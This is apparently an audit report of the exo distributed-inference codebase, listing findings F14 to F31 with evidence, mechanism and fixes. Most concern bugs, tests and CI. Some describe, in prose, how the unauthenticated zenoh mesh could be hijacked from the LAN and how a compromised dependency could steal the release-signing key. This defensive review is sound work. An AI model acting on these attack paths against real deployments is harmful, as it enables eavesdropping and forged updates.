**Evidence.** `readAllEventLogs` (BugReportService.swift:173-190) uploads every `~/.exo/event_log/{master,api}/events.*` file. The API appends every event to that log: `self._event_log.append(i_event.event)` (src/exo/api/main.py:1972), which includes `TaskCreated{task: TextGeneration{task_params}}` (events.py:35-37, tasks.py:59-61 — full `chat_template_messages`/`instructions`), `ChunkGenerated{chunk}` (every generated token, events.py:93-95) and `InputChunkReceived{chunk: InputImageChunk{data}}` — base64 image uploads, emitted by the master at src/exo/master/main.py:398-401. `readAllLogs` (157-171) uploads `~/.exo/exo_log/*`, where `-v` logging writes full prompts (`logger.debug(prompt)`, src/exo/worker/engines/mlx/utils_mlx.py:679). `readSystemMetadata` (335-433) collects `hardware_uuid`, `default_mac`, `wifi_ssid` (via the private `airport -I`, 404-407), `user`, `console_user`, all interface IPs. The only consent copy is `Text("Diagnostic logs will be uploaded with your report.")` (BugReportWindowController.swift:100).

**Mechanism.** A user clicks Send after a crash. Every prompt and answer from up to six event-log generations (active + 5 zstd archives, `_MAX_ARCHIVES = 5`, disk_event_log.py:20), including any credentials, code or personal data pasted into chats by any client on the LAN using this node, plus uniquely identifying hardware/network data, is PUT to `reports.exolabs.net` presigned S3 URLs. Nothing in the UI says conversation contents are included.

**Fix.** Drop `readAllEventLogs()` from the upload set, or filter events client-side before upload (skip `TaskCreated`, `ChunkGenerated`, `InputChunkReceived`) — better, redact at the source (see the event-log finding). Remove `hardware_uuid`, `default_mac`, `wifi_ssid`, `user`/`console_user` or replace with a salted hash. Replace the caption with an explicit list of what is uploaded and a 'Preview report' button; add an 'Include conversation logs' checkbox defaulting to off.

### F15 — BatchGenerator admits new requests by running their full prefill synchronously, stalling every in-flight decode stream

*`src/exo/worker/engines/mlx/generator/batch_generate.py:234` — high · effort L · verified · lens `performance` · confidence 0.90*

**Evidence.** runner batch_generator.py:409-417: `while self._queue and len(self._active_tasks) < EXO_MAX_CONCURRENT_REQUESTS: task = self._queue.popleft() ... uid = self._start_task(task)` runs before `results = self._gen.step()` at 439. `_start_task` -&gt; `ExoBatchGenerator.submit` (batch_generate.py:121-327), which calls `prefill(...)` at 234-243 (or `remote_prefill` 218-226) over the whole prompt and only then `self._mlx_gen.insert(prompts=[last_tokens...])` at 301-307 with just the last two tokens. generate.py:336-366 processes the prompt in 4096-token chunks in a single call with no way to yield between chunks; `pipeline_parallel_prefill` (164-279) likewise. EXO_MAX_CONCURRENT_REQUESTS defaults to 8 (constants.py:106).

**Mechanism.** Request A is decoding at ~30 tok/s; request B arrives with a 32k-token prompt. `step()` prefills B to completion (tens of seconds at ~1k tok/s on a large model) before calling `_mlx_gen.next()` again, so A's SSE stream emits nothing (the keepalive comment hides the stall from proxies but the user sees a frozen response). If several requests are queued they are all prefilled back-to-back in the same `while` loop, so the stall is the sum of their prefills. On multi-rank instances every rank stalls identically. Continuous batching therefore degrades to head-of-line blocking whenever prompts are long.

**Fix.** Make admission incremental: `submit` should only tokenize, do the prefix-cache lookup and register a pending-prefill entry; `step()` should process at most one prefill chunk (bounded token budget, e.g. `prefill_step_size`) for one pending task per call, then run a decode step, and only call `_mlx_gen.insert` once that task's prefill is complete (SSM snapshots/pipeline sends already work per chunk). Alternatively hand the raw prompt to mlx_lm's `BatchGenerator` (already constructed with `prefill_step_size=4096` at 105-109), which interleaves prompt processing with generation, keeping exo's custom prefill only for the pipeline-parallel and remote-prefill paths.

### F16 — Responses streaming swallows ErrorChunk and emits response.completed with status "completed"

*`src/exo/api/adapters/responses.py:526` — high · effort S · verified · lens `api-compat` · confidence 0.90*

**Evidence.** responses.py:526-527: `if isinstance(chunk, ErrorChunk):\n    break`. Execution continues to 736-821 which emits output_item.added/content_part.added for an empty message, output_text.done, and finally `ResponsesResponse(... status="completed", output_text=accumulated_text ...)` inside `ResponseCompletedEvent` (810-821). openai_responses.py:432-442 `ResponsesResponse` has no `error` or `incomplete_details` field and ResponsesStreamEvent (609-625) has no `response.failed`/`error` member.

**Mechanism.** Codex CLI / openai SDK consumers of /v1/responses see a fully well-formed `response.completed` event with empty output when the runner errored. `chunk.error_message` is never read. Agents record an empty successful turn; nothing retries, nothing logs the real failure.

**Fix.** Add `error: ResponseError | None` and `incomplete_details` to ResponsesResponse plus a `ResponseFailedEvent(type="response.failed", response=...)`. On ErrorChunk: emit `response.failed` with `status="failed"`, `error={"code":"server_error","message":chunk.error_message}` and return without emitting the message/completed frames.

### F17 — Global backslash strip runs after code blocks are restored, corrupting `\n`, `\t`, regex escapes and Windows paths in every code snippet and its Copy button

*`dashboard/src/lib/components/MarkdownContent.svelte:347` — high · effort S · verified · lens `dashboard` · confidence 0.90*

**Evidence.** Lines 340-344 restore the protected code: `processed = processed.replace(new RegExp(`${CODE_PLACEHOLDER_PREFIX}(\\d+)END`, "g"), (_, index) => codeBlocks[parseInt(index)]);` and only THEN line 347: `processed = processed.replace(/\\(?=[a-zA-Z])/g, ""); // Remove \ before letters`. The renderer at line 27-36 receives the already-mangled `text` and emits `data-code="${encodeURIComponent(text)}"`, so the clipboard payload is corrupted too.

**Mechanism.** A model answers with ```c printf("hello\n"); ``` or `C:\Users\me` or the regex `\d+`; the dashboard renders and copies `printf("hellon")`, `C:Usersme`, `d+`. Inline code (`\n`) is affected the same way. For a coding-assistant UI this silently breaks the most common copy-paste workflow, and there is no test to catch it (no test files exist under dashboard/src).

**Fix.** Move the code-block restore (lines 340-344) to AFTER the stray-backslash cleanup at line 347, or apply the cleanup only to non-code segments (split on the placeholders). Add a unit test asserting that a fenced block containing `\n` survives `preprocessLaTeX` byte-for-byte.

### F18 — download_shard swallows file-list fetch failures (incl. HF 401/403) so the download silently no-ops and never becomes DownloadFailed

*`src/exo/download/download_utils.py:898` — high · effort S · verified · lens `download` · confidence 0.90*

**Evidence.** download_utils.py:430-449: `except Exception as e:` (which catches HuggingFaceAuthenticationError re-raised at :463-464) ends with `raise FileNotFoundError(f"Failed to fetch file list for {model_id}: {e}") from e`. download_utils.py:898-913: `except FileNotFoundError: not_started_progress = RepoDownloadProgress(... status="not_started" ...); return EXO_DEFAULT_MODELS_DIR / model_id.normalize(), not_started_progress` — no `on_progress` call, no raise. impl_shard_downloader.py:134-158 discards the progress (`target_dir, _ = await download_shard(...)`; `return target_dir`). coordinator.py:282-291 sets `DownloadOngoing` before the task starts; :293-313 `download_wrapper` only emits `DownloadFailed` inside `except Exception`. coordinator.py:387-418 rescan later rewrites the status to `DownloadPending`; plan.py:150-167 re-plans `DownloadModel` whenever status is not Ongoing/Completed/Failed.

**Mechanism.** User starts a download of a gated repo without HF_TOKEN (or any repo while the HF tree API is unreachable). `_fetch_file_list` raises HuggingFaceAuthenticationError -&gt; wrapped as FileNotFoundError -&gt; `download_shard` returns quietly -&gt; `ensure_shard` returns normally -&gt; coordinator emits nothing. Cluster state shows `DownloadOngoing` at 0 B/s for up to 60 s, then the rescan flips it to `DownloadPending`, the worker's `_model_needs_download` fires again, and the cycle repeats forever. The carefully built message from `_build_auth_error_message` (:90-104, 'Set HF_TOKEN ...') never reaches state or the user; the instance sits Idle with no diagnosable error.

**Fix.** In `download_shard`, only convert FileNotFoundError into `not_started` when `skip_download=True` (status probing); when actually downloading, let the exception propagate (`raise`) so `download_wrapper` emits `DownloadFailed(error_message=...)`. In `fetch_file_list_with_cache` re-raise `HuggingFaceAuthenticationError` untouched instead of wrapping it (add `except HuggingFaceAuthenticationError: raise` before the generic handler) so the auth text survives. Add a coordinator test: a downloader whose ensure_shard returns without ever calling on_progress must not leave status as DownloadOngoing.

### F19 — CI runs pytest only on macOS; both Linux targets ship with zero Python tests executed

*`.github/workflows/pipeline.yml:106` — high · effort M · verified · lens `test-gaps` · confidence 0.90*

**Evidence.** pipeline.yml:106-107: `- name: Run pytest (macOS only)` / `if: runner.os == 'macOS'`. The Linux runners (x86_64-linux, aarch64-linux at :17-22) only run `nix flake check` (:103), and python/parts.nix:288-300 defines `checks = { lint = ...ruff...; typecheck = ...basedpyright... }` — no pytest. Verified locally on this Linux box: `pytest src --ignore=<mlx dirs>` collected and passed 319 tests, 4 skipped, in 30 s with no GPU and no mlx installed.

**Mechanism.** Any regression in platform-sensitive code paths that exo supports on Linux (AsyncProcess fd capture in src/exo/utils/async_process.py, Pidfile flock, XDG path resolution, download/model-dir logic, event log rotation, election, apply) is only ever tested on macOS. The comment in pipeline.yml ('needs GPU access for MLX') is true for ~40 slow/MLX tests but not for the other ~320. flake.nix declares Linux as first-class (systems x86_64-linux, aarch64-linux) yet the Linux artifacts are never test-gated.

**Fix.** Add a pytest step for Linux runners: `$TEST_ENV/bin/python -m pytest src -m "not slow and not metal" --ignore=src/exo/worker/engines/mlx --ignore=src/exo/worker/tests/unittests/test_mlx` (or introduce a `metal` marker registered in pyproject `[tool.pytest.ini_options] markers` and apply it to test_runner/test_image/test_mlx). Keep the macOS step as is. Also consider making exo-test-env on Linux include the mlx-cpu extra so `test_batch_generate`/`test_extract_top_logprobs` run there too.

### F20 — test_master.py constructs a real Master that rotates and unlinks the operator's live event log under $HOME

*`src/exo/master/tests/test_master.py:89` — high · effort S · verified · lens `test-gaps` · confidence 0.90*

**Evidence.** Master.__init__ (src/exo/master/main.py:145) does `self._event_log = DiskEventLog(EXO_EVENT_LOG_DIR / "master")`; DiskEventLog.__init__ (disk_event_log.py:76-80) rotates any existing `events.bin`, and `_rotate` (:166-181) compresses it, `source.unlink()`s it and prunes archives beyond 5. EXO_TESTS=1 is set by pytest-env but `grep EXO_TESTS src` finds no consumer, and EXO_EVENT_LOG_DIR (constants.py:92) is derived from the real data home. Verified: running the test with HOME pointed at a scratch dir created `.local/share/exo/event_log/master/events.2026-09-08_11-35-24_189819.bin.zst`.

**Mechanism.** CLAUDE.md's own workflow runs `uv run exo &` for dashboard screenshots; running `uv run pytest` while that node is master unlinks its `events.bin` out from under it. The running master keeps writing to the unlinked inode, but `RequestEventLog` replay (master/main.py:454-464) reopens the file by path (disk_event_log.py:125, 141) and now reads the test's empty file, so nack replay to lagging workers returns nothing. Each test run also consumes one of the 5 archive slots, evicting real crash-diagnosis logs. The same pattern (real-home paths) is used by test_node_id_persistence.py (`EXO_NODE_ZID`) and test_xdg_paths.py leaves `exo.shared.constants` reloaded with a patched environment for the rest of the session (no restore after `importlib.reload`).

**Fix.** Inject the log directory into Master (`event_log_dir: Path = EXO_EVENT_LOG_DIR / "master"` constructor kwarg) and pass `tmp_path` in test_master.py. Add an autouse session fixture in a root conftest that sets `EXO_HOME`/`XDG_DATA_HOME`/`XDG_CACHE_HOME` to a tmp directory before `exo.shared.constants` is imported, so no unit test can touch the real ~/.exo. In test_xdg_paths.py, add a fixture that re-`reload`s constants with the original environment on teardown.

### F21 — Sparkle private signing key is job-level env and the Developer ID keychain is unlocked before dependency/import code runs, so any compromised package can sign updates

*`.github/workflows/build-app.yml:32` — high · effort S · verified · lens `build-deps` · confidence 0.90*

**Evidence.** build-app.yml:27-37 job `env:` includes `SPARKLE_ED25519_PRIVATE: ${{ secrets.SPARKLE_ED25519_PRIVATE }}` (plus feed URL, S3 bucket/prefix). The only consumer redeclares it at step level (:462-472 `SPARKLE_ED25519_PRIVATE: ${{ secrets... }}` ... `echo "$SPARKLE_ED25519_PRIVATE" > sparkle_ed25519.key` written into `output/`). Keychain step :200-239 imports the cert with `-T /usr/bin/codesign` and `security set-key-partition-list -S apple-tool:,apple:,codesign: -s -k ...` so codesign never prompts; it runs BEFORE :319-325 `nix develop --command ...` and :327-328 `uv run pyinstaller` whose spec (exo.spec:56-63) calls `collect_submodules("mlx")`, `mlx_lm`, `mlx_vlm`, `transformers`, importing every submodule of packages that come from three personal-account git branches (pyproject.toml:84,96,97) and 186 locked packages.

**Mechanism.** Any import-time code in any of those packages (or a hijacked fork branch at next lock refresh) can read `$SPARKLE_ED25519_PRIVATE` from the environment and exfiltrate it, then sign an arbitrary appcast that every installed EXO.app will auto-apply via Sparkle; it can also invoke `/usr/bin/codesign --sign` with the imported Developer ID identity without a password prompt. Job-level exposure also means `brew install`, `uv sync` (builds sdists), `xcodebuild`, and the Sparkle CLI download all see the key.

**Fix.** Delete `SPARKLE_ED25519_PRIVATE`, `SPARKLE_S3_*`, `SPARKLE_DOWNLOAD_PREFIX` from the job `env:` (:29-35) and keep them only on the steps that use them (:462-484, :518-545). Reorder: run "Add pinned macmon" and "Build PyInstaller bundle" before "Prepare code-signing keychain". Write the key file under `$RUNNER_TEMP`, not `output/`, and `rm -f` it after `generate_appcast`. Consider using GitHub environments with required reviewers for the signing job.

### F22 — A single lost or late election message leaves two masters permanently: same-clock disagreement never triggers a new round

*`src/exo/shared/election.py:157` — high · effort M · verified · lens `control-plane` · confidence 0.85*

**Evidence.** election.py:136-157: a round is only started for `message.clock > self.clock`; an equal-clock message is just `self._candidates.append(message)` even when the round it belongs to already finished (the list is dead) and even when `message.proposed_session != self.current_session`. The 'minor hack' rebroadcast (line 216) is sent *after* the sender's own `campaign_timeout` sleep, i.e. after a same-clock peer's window has also closed. Scratch harness with two real `Election` instances cross-wired through channels, both receiving a ConnectionMessage, dropping B's first clock-1 status only: `A.current_session=(A,0)`, `B.current_session=(B,0)`, still disagreeing 6 s later (B's rebroadcast arrived at A with clock == A.clock and was appended to the finished list).

**Mechanism.** zenoh pub/sub is not guaranteed delivery under load, and even without loss the two 3 s windows are not aligned. Once nodes diverge each node follows its own ElectionResult: two Masters with two SessionIds, each side's EventRouter filters the other's events (event_router.py:120-123), workers/APIs on one side cannot see instances placed on the other, and nothing re-runs the election until an unrelated connection change bumps the clock. Operators see a cluster where `/state` differs per node and placements 'disappear' depending on which node they query.

**Fix.** In `_election_receiver`, treat an equal-clock message as a disagreement signal: if `self._campaign_cancel_scope is None` (no round in flight) and `message.proposed_session != self.current_session` and `message > self._election_status()`, do `self.clock += 1` and start a new campaign (peers with the lower clock will join). Complement with a master heartbeat: the elected master re-sends its ElectionMessage every few seconds so a divergent node detects the mismatch within one interval. Add a two-node lossy-channel test (drop the winner's first status) asserting convergence within 2 rounds.

### F23 — plan_step awaits TaskAcknowledged with no timeout, so a busy or wedged runner freezes the Worker and defers cancellation until prefill completes

*`src/exo/worker/main.py:375` — high · effort M · verified · lens `worker-runner` · confidence 0.85*

**Evidence.** main.py:373-377 `_start_runner_task` does `await self.runners[...].start_task(task)`; supervisor.py:290-299 `event = anyio.Event(); self.pending[task.task_id] = event; ... await event.wait()` with no deadline (only the Shutdown branch, main.py:284, wraps in `fail_after(3)`). The runner acks generation tasks only when it drains its queue: runner.py:359 `item = self._work_queue.get_nowait()` once per `step()`, ack at 373. `BatchGenerator.step` → `_start_task` (batch_generator.py:409-412, 546-552) → `ExoBatchGenerator.submit` (batch_generate.py:121) runs `prefill(...)` synchronously (batch_generate.py:234). The only liveness probe is supervisor.py:357-362 `_watch_runner`: `if not self.runner_process.is_alive()`. `PREFILL_TIMEOUT_SECONDS = 60`, `DECODE_TIMEOUT_SECONDS = 5` (supervisor.py:57-58) and `initialize_timeout` (187, 208) are never used. The ack-wait is load-bearing because plan mints a fresh task id each tick (plan.py:215 `ConnectToGroup(instance_id=...)`), and a repeat would hit runner.py:308-311 `raise ValueError(...)`.

**Mechanism.** With EXO_MAX_CONCURRENT_REQUESTS=8, a second request arriving while the runner is prefilling a long prompt makes `plan_step` block in `start_task` for the whole prefill. Since `plan()` is one coroutine, `_cancel_tasks` (highest precedence) cannot dispatch the CancelTask for the request being prefilled — the user's stop button does nothing — and `_kill_runner`/`_create_runner`/`DownloadModel` for every other instance on the node are starved. If the runner is alive but wedged (peer died mid-collective, ring init waiting for a peer that never comes, Metal hang, the EXO_RUNNER_MUST_TIMEOUT debug prompt), the ack never arrives, `_watch_runner` sees a live pid, and the Worker on that node is frozen until someone restarts exo; the log shows only 'Starting task ...'.

**Fix.** Stop blocking the plan loop: have `start_task` return after `send_async`, and make `plan()` skip any runner whose `pending` dict is non-empty (the field already exists and `FakeRunnerSupervisor.pending` in conftest suggests this was intended) so tasks are never double-dispatched. Wire the unused timeouts into `_watch_runner` as a heartbeat watchdog: record the time of the last event from the runner per phase (RunnerStatusUpdated, PrefillProgressChunk, ChunkGenerated), and call `_check_runner(TimeoutError(...))` when the phase deadline (initialize / prefill / decode) elapses, so an alive-but-wedged runner is torn down like a dead one.

### F24 — Any master change is a cluster-wide reset: every node kills all runner processes and forgets all instances, so master loss = total inference outage requiring manual re-placement

*`src/exo/main.py:257` — high · effort L · verified · lens `resilience` · confidence 0.85*

**Evidence.** main.py:243-272: on `result.is_new_master`, `await self.worker.shutdown()` then `self.worker = Worker(...)`; worker/main.py:119-127 `Worker.run` finally: `for runner in self.runners.values(): runner.shutdown()` (kills every runner process via supervisor.py:269-273 `runner_process.stop()`). The promoted master starts with `self.state = State()` (master/main.py:136) and the API resets to `State()` (api/main.py:302). Even if runners survived, plan.py:80-83 `_kill_runner` returns `Shutdown` for any runner whose instance is not in the (now empty) `instances`. Nothing re-announces instances to the new master: DownloadCoordinator re-emits download status (coordinator.py:354-475) and the worker re-emits NodeGatheredInfo, but there is no `InstanceCreated` replay. Election seniority is in-memory only (election.py:232 `self.seniority = max(self.seniority, len(candidates))`), so a master that crash-restarts comes back with seniority 0 and loses to a peer, triggering exactly this path.

**Mechanism.** Three-node cluster, master on node A, a 70B model sharded across B and C. A reboots (or its NIC drops). B/C elect a new master; B and C each tear down their loaded shards, drop the instance, and start from empty state. Every in-flight request dies (see the reset finding), every model has to be re-placed and re-loaded by hand from the dashboard, and the same happens on a partition heal for the losing side. The failure of a node that was not even serving the model takes the model offline.

**Fix.** Make instances survive a session change: (1) on `is_new_master`, keep `RunnerSupervisor`s alive across the Worker swap (hand `self.runners` to the new Worker instead of shutting them down), and (2) have each worker re-announce its live `BoundInstance`s to the new master (e.g. a `RunnerStatusUpdated`-like `InstanceObserved` event the master folds into `state.instances` when the full `node_to_runner` set is reported), so `_kill_runner` no longer sees the instance as missing. Persist seniority (or derive it from the on-disk event log length) so a briefly-restarted master reclaims leadership instead of forcing this path. Until then, at minimum log at WARNING that a master change is tearing down N instances so operators understand why everything vanished.

### F25 — zenoh mesh has no transport auth or TLS: any host that can reach TCP 52414 can read prompts/tokens in cleartext and publish commands or election messages; namespace only gates discovery

*`rust/networking/src/lib.rs:31` — high · effort L · verified · lens `security` · confidence 0.85*

**Evidence.** `cfg()` (lib.rs:22-48) sets `mode: router`, `listen/endpoints: ["tcp/[::]:{listen_port}"]` (31), `adminspace/enabled: true` (35), `scouting/gossip/multihop: true`, and configures nothing under `transport/auth` or `transport/link/tls`. The namespace is only hashed into the discovery packet (`Hello.namespace`, discovery.rs:169-172) and never used by the zenoh session: `open()` (lib.rs:52-102) only feeds it to `Discovery::new`. Topics are plain `topics/<name>` (swarm.rs:143, 154). `COMMANDS`, `GLOBAL_EVENTS`, `LOCAL_EVENTS`, `ELECTION_MESSAGES`, `DOWNLOAD_COMMANDS` are all `PublishPolicy.Always` (src/exo/routing/topics.py:43-53). The master's command processor does not validate `ForwarderCommand.origin` (src/exo/master/main.py:128-145, 367). The discovery nonce is broadcast every second via multicast (discovery.rs:262-268) and any host on the link can answer `WhatsUp` with an arbitrary zid/port (212-238), after which the node calls `runtime.connect_peer` (lib.rs:90-98).

**Mechanism.** A rogue machine on the same LAN/Wi-Fi (guest network, shared office) runs a zenoh client with `connect: tcp/<node>:52414`, subscribes to `topics/**`, and receives every `TextGeneration` command (full chat messages) and every `ChunkGenerated` token in cleartext. It can publish `DeleteInstance`, `DeleteDownload` (see rmtree finding), or `ElectionMessage`s with high seniority to become master and rewrite cluster state. Since `--namespace` defaults to the exo version string, two unrelated exo users on one network also auto-merge into one cluster.

**Fix.** Derive a cluster secret from the namespace or a config value and enable zenoh `transport/auth/usrpwd` (or `transport/link/tls` with a PSK-signed cert) in `cfg()`, so peers outside the namespace cannot open a session at all. Prefix key expressions with the namespace hash (`topics/<ns8>/<topic>`, `live/<ns8>/<zid>`) so cross-namespace traffic never routes. Set `adminspace/enabled` to false (nothing in the codebase queries `@/**`). Document the trust model explicitly in README (currently only `localhost` is mentioned).

### F26 — Late-joining node replays the entire per-token event history in 1000-event broadcast rounds; no state snapshot exists

*`src/exo/master/main.py:457` — high · effort L · verified · lens `performance` · confidence 0.85*

**Evidence.** event_router.py:432 starts each session with `buf = OrderedBuffer[Event]()` (next index 0); 440-457: any out-of-sequence event triggers `_nack_request(buf.next_idx_to_release)`; 469-496: each NACK sleeps `0.5 * 2**attempts` (attempts reset to 0 whenever anything drains). master/main.py:454-464: `end = min(command.since_idx + 1000, len(self._event_log))` then `for ... self._event_log.read_range(...)`: `await self._send_indexed_event(...)` which publishes on GLOBAL_EVENTS to every node (525-534). The log contains every `ChunkGenerated` because `_event_processor` appends unconditionally (518-522) even though `apply.py:85-93` treats ChunkGenerated/InputChunkReceived/Traces* as pass-through. `read_range` deserialises each record via msgpack -&gt; json.dumps -&gt; pydantic (disk_event_log.py:27-34). Every receiving node fully parses each replayed event (router.py:250-251 `publish_bytes` -&gt; `deserialize`) before `OrderedBuffer.ingest` discards it as stale (event_buffer.py:206-207).

**Mechanism.** A node that joins or reconnects after K events in the session needs ceil(K/1000) NACK rounds, each &gt;=0.5 s plus master processing; a session that has streamed 500k tokens (a few busy hours) takes ~5+ minutes to catch up, during which the node has no instances in its state (its API 404s, its worker will not create runners). Every round is broadcast, so all N nodes deserialize and discard 1000 events per round, and the master's `_command_processor` is blocked for the duration of each 1000-event send, delaying TextGeneration commands. Log size and catch-up time grow without bound for the life of the session.

**Fix.** Answer a `RequestEventLog` whose `since_idx` is far behind the head with a snapshot (`State` is already JSON-serialisable via its TopologySnapshot serializer) plus the head index, letting the joiner set `next_idx_to_release` directly; stop persisting pass-through events (ChunkGenerated, InputChunkReceived, TracesCollected/Merged) in `DiskEventLog` since they cannot change a replica's state; and send catch-up slices only to the requesting origin (a per-node key/topic) rather than on GLOBAL_EVENTS.

### F27 — Base64 images and 2x-scale PDF page renders are persisted into one localStorage key; first quota overflow silently disables ALL conversation persistence

*`dashboard/src/lib/stores/app.svelte.ts:667` — high · effort M · verified · lens `dashboard` · confidence 0.85*

**Evidence.** `saveConversationsToStorage` (654-671) strips only `tokens` ("Strip tokens from messages before saving to avoid bloating localStorage") then `localStorage.setItem(STORAGE_KEY, JSON.stringify(stripped))` inside try/catch whose only handler is `console.error`. Generated images are stored as `preview: `data:${mimeType};base64,${imageData}`` (2812-2816, 2950-2953, 3175-3180). User image uploads keep `preview` (2335-2340); PDFs keep `pageImages` (2347-2352) produced by files.ts:36 `PDF_PAGE_SCALE = 2.0` + `readAsDataURL` (files.ts:255-270). `persistConversation` is invoked on every streamed token, throttled to 400 ms (2244, 2643).

**Mechanism.** A single 1024x1024 PNG is ~1.3 MB as base64; a 10-page PDF at 2x is several MB. Safari/Firefox cap localStorage at ~5 MB per origin. After a few image generations `setItem` throws QuotaExceededError, which is swallowed — from then on every text chat, rename, and delete is lost on reload with no user-visible signal. Meanwhile, during streaming the whole multi-megabyte conversation array is `JSON.stringify`'d on the main thread every 400 ms, causing visible jank.

**Fix.** Persist attachments separately from message text: keep the transcript in localStorage but store `preview`/`pageImages`/generated-image blobs in IndexedDB keyed by attachment id (or drop them to a downscaled thumbnail before persisting). Catch `QuotaExceededError` explicitly and surface a toast (`addToast` already exists) instead of `console.error`. Move the throttled persist to run on an idle callback rather than per token.

### F28 — DownloadCoordinator command loop has no error boundary; any unexpected exception crashes the whole exo process

*`src/exo/download/coordinator.py:160` — high · effort S · verified · lens `download` · confidence 0.85*

**Evidence.** coordinator.py:160-173 `_command_processor`: `match cmd.command: case StartDownload(...): await self._start_download(shard) ... case DeleteDownload(...): await self._delete_download(model_id)` with no try/except. coordinator.py:142-148 `run()` only handles `except* (EventRouterBrokenResourceError, EventRouterClosedResourceError)`. main.py:161 `tg.start_soon(self.download_coordinator.run)` in the Node's root anyio group (utils/task_group.py:46-65 is a thin wrapper, so a child exception cancels siblings and propagates). Concrete raisers reachable from the loop: download_utils.py:249 `shutil.rmtree(model_dir, ignore_errors=False)` (PermissionError); :302 `full_path.stat()` inside `_scan_model_directory` (OSError on a broken symlink/unreadable file); :398-400 fresh-cache `TypeAdapter(list[FileListEntry]).validate_json(...)` outside any try (ValidationError on a truncated cache file, which is written non-atomically at :425-428).

**Mechanism.** Operator points EXO_MODELS_DIRS at a directory where exo lacks delete permission (or a file is root-owned) and clicks Delete in the dashboard: `delete_model` raises PermissionError -&gt; `_delete_download` -&gt; `_command_processor` -&gt; coordinator task group -&gt; Node task group -&gt; the entire node (API, worker, master, election) shuts down. Same outcome for a corrupt file-list cache after an unclean shutdown or a broken symlink in a pre-seeded model dir. Contrast: the rescan loop at :471-474 does wrap in `except Exception`, showing the intent is to keep the coordinator alive.

**Fix.** Wrap each command dispatch in `_command_processor` with `try/except Exception` that logs and, for StartDownload/DeleteDownload, emits `DownloadFailed(error_message=str(e))` for that model so the failure is visible in state rather than fatal. Make `delete_model` catch `OSError` and return a typed result (or re-raise as a DownloadError handled by the coordinator). Make the fresh-cache read at :398-400 tolerate `ValidationError` by deleting the cache file and refetching. Document in the `run()` docstring which exceptions are expected to escape (per RULES.md error-handling rule).

### F29 — Tensor-parallel numerical correctness test is unconditionally skipped and asserts an unachievable bit-exact invariant

*`src/exo/worker/tests/unittests/test_mlx/test_tp_bit_exact.py:425` — high · effort M · verified · lens `test-gaps` · confidence 0.85*

**Evidence.** test_tp_bit_exact.py:425 `@pytest.mark.skip("TP=2 is currently very different to TP=1. This test will not pass")` over the only test of `tensor_auto_parallel` across 10 architectures (MODEL_CONFIGS :15-307, incl. deepseek_v3/v4, gpt_oss, gemma4, minimax). :412-414 `assert max_diff == 0.0` demands bit-exact bf16 logits although a ring all-reduce changes summation order. :417-421 marks it slow + `skipif(sys.platform != "darwin", reason="MLX distributed requires Metal")` even though :265 uses `mx.distributed.init(backend="ring")`, which is a TCP backend that also runs on mlx-cpu.

**Mechanism.** There is no executable test of tensor-parallel sharding math for any model family. A regression in auto_parallel.py (e.g. wrong split of KV heads, MoE expert sharding, MLA lora ranks) only surfaces as garbage output on a multi-Mac cluster after model download. The skip reason ('very different') is itself a bug report that nothing tracks. The darwin-only skipif blocks the one place this could run cheaply (tiny random-weight models, ~seconds) in a Linux CI job.

**Fix.** Replace the bit-exact assertion with a tolerance check appropriate for bf16 reductions, e.g. `np.testing.assert_allclose(tp, ref, rtol=2e-2, atol=2e-2)` plus `assert (ref.argmax(-1) == tp.argmax(-1)).mean() > 0.95`; remove the unconditional `@pytest.mark.skip`, keep `slow` only if runtime demands it, and drop the darwin skipif (guard instead on `importlib.util.find_spec("mlx")`). If a specific architecture is genuinely broken, `pytest.param(name, marks=pytest.mark.xfail(strict=True, reason=...))` that one so the failure is tracked and a fix flips it red-to-green automatically. Run it in the Linux CI job with mlx-cpu.

### F30 — EventRouter (session filtering, nack backoff, out_for_delivery retry) has no tests despite a recent crash fix

*`src/exo/routing/event_router.py:154` — high · effort M · verified · lens `test-gaps` · confidence 0.85*

**Evidence.** src/exo/routing/tests/ contains only test_event_buffer.py (OrderedBuffer). Untested paths in event_router.py: session/origin drop at :120-123, `out_for_delivery` re-send after 5 s at :76-83, nack scheduling `_tg.start_soon(self._nack_request, buf.next_idx_to_release)` at :136-142, exponential backoff `delay = 0.5 * 2**attempts` capped at 10 s and reset at :131-132/:165-167, and the master's RequestEventLog replay (master/main.py:454-464, 1000-event window). git log shows `74e9fe1 fix(bug): EventRouter lifetime-handling fixed, no more process crashes (#2102)` touched this component without adding a test.

**Mechanism.** A worker that misses one GlobalForwarderEvent (zenoh drop, reconnect) depends entirely on this code to request `since_idx` and on the master to replay; a regression here (e.g. nack never fires, replay off-by-one, events from a stale session accepted after a new master is elected) shows up as a worker whose State silently diverges — instances never start, or the `assert state.last_event_applied_idx == event.idx - 1` in apply.py:134 fires and kills the worker task. None of this is exercised anywhere in `src`, and the integration tests that could catch it are ignored by default.

**Fix.** Add src/exo/routing/tests/test_event_router.py driving EventRouter with in-memory channels: (1) send GlobalForwarderEvent idx 0 then 2 for the right session -&gt; expect `RequestEventLog(since_idx=1)` on `command_sender` after `_nack_base_seconds` (set to 0.01 in the test), and exponential growth on repeated gaps, reset after idx 1 arrives; (2) events with a different `session` or `origin != master_node_id` are never delivered to `receiver()`; (3) an event sent through `sender()` that never echoes back is re-sent on `external_outbound` after 5 s (monkeypatch the 5 s constant or wrap `anyio.current_time`). Add a master-side test in test_master.py: append 5 events, send `RequestEventLog(since_idx=2)`, assert GlobalForwarderEvents idx 2..4 are re-emitted with identical event_ids.

### F31 — Release workflow's `uv sync --locked` no longer installs mlx, so the PyInstaller step aborts before any DMG is built

*`.github/workflows/build-app.yml:172` — high · effort S · verified · lens `build-deps` · confidence 0.85*

**Evidence.** build-app.yml:172 `uv sync --locked` then :328 `uv run pyinstaller packaging/pyinstaller/exo.spec`. pyproject.toml:7-30 `[project] dependencies` contain no mlx; mlx lives only in extras (pyproject.toml:50-61 `mlx = ["mlx==0.32.0", "mlx-lm", ...]`). packaging/pyinstaller/exo.spec:32-46 `_module_directory("mlx")` -&gt; `raise SystemExit(f"Module '{module_name}' is not available ...")` when `find_spec` returns None. History: 4466cd5 (#2087, 2026-05-13) removed `"mlx==0.31.2; sys_platform == 'darwin'"`, `mlx-lm`, `mlx-vlm` from core deps; 21a54c5 (#2245, 2026-08-25) added `--extra mlx` to justfile:19,22 only; build-app.yml last changed 2026-04-23. Local proof with uv 0.8.17: `uv sync --locked --dry-run --offline` -&gt; "Would make no changes"; with `--extra mlx` -&gt; "+ mlx==0.32.0 ... + mlx-lm @ git+... + mlx-vlm==0.4.4". Upstream exo-explore/exo main has the same `uv sync --locked` at line 172.

